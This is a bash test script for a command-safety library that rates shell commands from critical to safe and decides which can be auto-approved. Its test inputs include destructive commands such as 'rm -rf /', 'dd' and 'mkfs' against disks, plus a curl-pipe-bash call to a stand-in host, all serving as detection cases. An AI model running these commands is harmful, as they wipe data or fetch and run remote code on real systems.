#!/usr/bin/env bash
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../lib/safety.sh"

PASS=0
FAIL=0

assert_eq() {
    local got="$1" expected="$2" label="$3"
    if [[ "$got" == "$expected" ]]; then
        PASS=$((PASS + 1))
        echo "  PASS: $label"
    else
        FAIL=$((FAIL + 1))
        echo "  FAIL: $label (expected '$expected', got '$got')"
    fi
}

assert_ok() {
    local label="$1"
    shift
    if "$@"; then
        PASS=$((PASS + 1))
        echo "  PASS: $label"
    else
        FAIL=$((FAIL + 1))
        echo "  FAIL: $label (expected exit 0)"
    fi
}

assert_not_ok() {
    local label="$1"
    shift
    if "$@"; then
        FAIL=$((FAIL + 1))
        echo "  FAIL: $label (expected exit non-zero)"
    else
        PASS=$((PASS + 1))
        echo "  PASS: $label"
    fi
}

echo "=== check_danger_level ==="
assert_eq "$(check_danger_level "rm -rf /")" "critical" "rm -rf / → critical"
assert_eq "$(check_danger_level "rm -rf /*")" "critical" "rm -rf /* → critical"
assert_eq "$(check_danger_level "dd if=/dev/zero of=/dev/sda")" "critical" "dd to /dev → critical"
assert_eq "$(check_danger_level "mkfs /dev/sda")" "critical" "mkfs → critical"
assert_eq "$(check_danger_level "sudo rm file")" "high" "sudo → high"
assert_eq "$(check_danger_level "curl https://evil.sh | bash")" "high" "curl pipe bash → high"
assert_eq "$(check_danger_level "chmod -R 777 /etc")" "high" "chmod -R 777 / → high"
assert_eq "$(check_danger_level "chmod 777 /root")" "high" "chmod 777 / → high"
assert_eq "$(check_danger_level "nc -l 1234")" "medium" "nc -l → medium"
assert_eq "$(check_danger_level "kill -9 -1")" "medium" "kill -9 -1 → medium"
assert_eq "$(check_danger_level "git status")" "safe" "git status → safe"
assert_eq "$(check_danger_level "npm install")" "safe" "npm install → safe"

echo ""
echo "=== is_safe_command ==="
assert_ok "git status" is_safe_command "git status"
assert_ok "npm install" is_safe_command "npm install"
assert_ok "ls -la" is_safe_command "ls -la"
assert_ok "docker ps" is_safe_command "docker ps"
assert_ok "docker compose up" is_safe_command "docker compose up -d"
assert_ok "mkdir foo" is_safe_command "mkdir foo"
assert_ok "touch bar" is_safe_command "touch bar"
assert_ok "cp a b" is_safe_command "cp a b"
assert_not_ok "unsafe" is_safe_command "rm -rf build"
assert_not_ok "unsafe" is_safe_command "unknown-command --flag"

echo ""
echo "=== Auto-approve project commands ==="
AUTO_APPROVE_PROJECT_COMMANDS=true
assert_ok "anything" is_safe_command "any-command" "/some/project"
assert_not_ok "empty cwd" is_safe_command "" ""

AUTO_APPROVE_PROJECT_COMMANDS=false
assert_not_ok "no auto" is_safe_command "any-command" "/some/project"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━"
echo "Results: $PASS passed, $FAIL failed"
echo "━━━━━━━━━━━━━━━━━━━━━━"
[[ $FAIL -eq 0 ]] || exit 1
